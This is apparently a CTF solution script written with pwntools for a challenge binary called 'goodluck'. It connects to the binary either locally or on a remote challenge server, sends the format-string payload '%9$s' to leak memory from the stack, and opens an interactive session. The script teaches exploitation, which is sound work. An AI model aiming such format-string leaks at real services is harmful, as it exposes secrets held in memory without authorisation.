from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
#gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()
